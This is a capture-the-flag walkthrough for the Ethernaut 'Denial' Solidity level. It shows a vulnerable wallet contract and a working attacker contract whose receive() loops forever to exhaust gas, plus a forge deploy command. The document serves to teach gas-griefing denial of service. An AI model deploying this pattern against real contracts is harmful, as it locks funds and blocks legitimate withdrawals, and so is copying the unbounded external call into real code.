## Denial Level Outline

**Difficulty : 5/10**

This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.

If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address payable public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0xf1D573178225513eDAA795bE9206f7E311EeDEc3)

## Solution

This level has a very similar solution to level 9_King.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Contract {
    Denial denial;

    constructor(address _denial) {
        denial = Denial(_denial);
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while(true) {
            // lets burn some gas
        }
    }

}

interface Denial {
    function setWithdrawPartner(address) external;
}
```

##### 2. Deploy our new contract
```console
forge create src/Contract.sol:Contract --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

### Important Lesson From This Level
This level demonstrates that external calls to unknown contracts can still create **denial of service attack vectors** if a fixed amount of gas is not specified.

### [:arrow_left: Back To Main Menu](../)
